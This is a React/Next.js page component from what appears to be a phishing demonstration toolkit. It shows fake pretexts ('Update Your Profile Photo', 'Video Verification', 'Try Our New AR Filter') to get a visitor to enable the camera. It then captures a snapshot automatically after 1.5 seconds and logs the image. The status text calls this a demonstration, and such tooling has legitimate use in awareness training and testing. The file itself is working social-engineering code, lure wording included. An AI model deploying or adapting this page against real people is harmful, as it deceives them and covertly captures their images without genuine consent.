
"use client";
import { useEffect, useState, useRef } from 'react';
import { useParams } from 'next/navigation';
import { useLogs } from '@/contexts/LogContext';
import type { CameraData } from '@/types';
import { Button } from '@/components/ui/button';
import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
import { Camera as CameraIcon, VideoOff, CheckCircle, AlertTriangle } from 'lucide-react';

const templateContent: Record<string, { title: string, actionText: string, message: string }> = {
  'profile-photo': {
    title: 'Update Your Profile Photo',
    actionText: 'Enable Camera & Capture',
    message: 'A new profile photo is required. Please enable your camera to capture an image.',
  },
  'video-verification': {
    title: 'Video Verification',
    actionText: 'Start Video Verification',
    message: 'For security, we need to verify your identity via video. Please enable your camera.',
  },
  'ar-filter': {
    title: 'Try Our New AR Filter!',
    actionText: 'Test AR Filter',
    message: 'Check out our latest AR filter! Enable your camera to see it in action.',
  },
  default: {
    title: 'Camera Access Required',
    actionText: 'Enable Camera',
    message: 'This feature requires camera access. Please enable your camera to continue.',
  }
};

export default function CameraPhishingPage() {
  const { addLog } = useLogs();
  const params = useParams();
  const templateId = typeof params.id === 'string' ? params.id : 'default';
  const content = templateContent[templateId] || templateContent.default;

  const [status, setStatus] = useState<'idle' | 'requesting' | 'streaming' | 'captured' | 'error'>('idle');
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const intervalRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    addLog({ type: 'generic', data: { message: `Visited camera phishing page: /phishing/camera/${templateId}` } });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [templateId]);

  const captureImage = () => {
    if (videoRef.current && canvasRef.current && videoRef.current.readyState === 4 && videoRef.current.videoWidth > 0) {
      const video = videoRef.current;
      const canvas = canvasRef.current;
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext('2d');
      if (context) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageUrl = canvas.toDataURL('image/jpeg');
        const cameraData: CameraData = { imageUrl };
        addLog({ type: 'camera', data: cameraData });
        console.log("Image captured and logged.");
        setStatus('captured'); 
        // Stop the stream after capture for a single snapshot behavior
        stopCameraStream(true); // Pass a flag to indicate it's post-capture
      }
    }
  };
  
  const startCameraStream = async () => {
    if (streamRef.current) stopCameraStream();

    setStatus('requesting');
    setIsLoading(true);
    setError(null);

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
           if (videoRef.current) videoRef.current.play();
           setStatus('streaming');
           setIsLoading(false);
           setTimeout(captureImage, 1500); 
        };
      }
    } catch (err) {
      console.error("Camera access error:", err);
      let errorMessage = 'Could not access camera.';
      if (err instanceof DOMException) {
        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
          errorMessage = 'Camera access denied by user.';
        } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
          errorMessage = 'No camera found on this device.';
        }
      }
      setError(errorMessage);
      setStatus('error');
      addLog({ type: 'generic', data: { message: `Camera error: ${errorMessage}` } });
      setIsLoading(false);
    }
  };

  const stopCameraStream = (isAfterCapture = false) => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }
    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
    if (intervalRef.current) { 
      clearInterval(intervalRef.current);
      intervalRef.current = null;
    }
    // Only reset to 'idle' if not already 'captured' or 'error',
    // or if it's not an explicit stop after capture.
    // If isAfterCapture is true, the status should remain 'captured'.
    if (!isAfterCapture && status !== 'captured' && status !== 'error') { 
      setStatus('idle');
    }
  };

  useEffect(() => {
    return () => {
      stopCameraStream();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <PhishingPageLayout 
        title={content.title}
        isLoading={isLoading && status !== 'streaming'}
        error={error}
        statusMessage={status === 'captured' ? 'Camera snapshot captured successfully for demonstration.' : undefined}
    >
      <p className="text-center text-muted-foreground mb-6">{content.message}</p>

      <div className="aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border">
        <video ref={videoRef} className="w-full h-full object-cover" playsInline muted />
        {status !== 'streaming' && status !== 'captured' && (
          <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/50">
            <VideoOff className="h-16 w-16 text-white/70 mb-2" />
            <p className="text-white/90">Camera feed inactive</p>
          </div>
        )}
      </div>
      <canvas ref={canvasRef} className="hidden"></canvas>

      {(status === 'idle' || status === 'error') && (
        <Button 
          onClick={startCameraStream} 
          className="w-full bg-accent hover:bg-accent/90 text-accent-foreground"
          disabled={isLoading}
        >
          <CameraIcon className="mr-2 h-5 w-5" />
          {isLoading ? 'Initializing Camera...' : content.actionText}
        </Button>
      )}

      {status === 'streaming' && !isLoading && (
         <div className="text-center p-3 bg-blue-50 border border-blue-200 rounded-md">
          <p className="font-medium text-blue-700">Camera active. Capturing snapshot...</p>
          <Button onClick={() => stopCameraStream()} variant="outline" size="sm" className="mt-2">Stop Camera</Button>
        </div>
      )}

      {status === 'captured' && (
        <div className="text-center p-4 bg-green-50 border border-green-200 rounded-md">
          <CheckCircle className="mx-auto h-10 w-10 text-green-600 mb-2" />
          <p className="font-semibold text-green-700">Image Captured</p>
          <p className="text-sm text-green-600">An image has been captured. This window can now be closed.</p>
        </div>
      )}
       {status === 'error' && error && (
         <div className="text-center p-4 bg-red-50 border border-red-200 rounded-md">
          <AlertTriangle className="mx-auto h-10 w-10 text-red-600 mb-2" />
          <p className="font-semibold text-red-700">Camera Access Failed</p>
          <p className="text-sm text-red-600">{error}</p>
        </div>
      )}
    </PhishingPageLayout>
  );
}
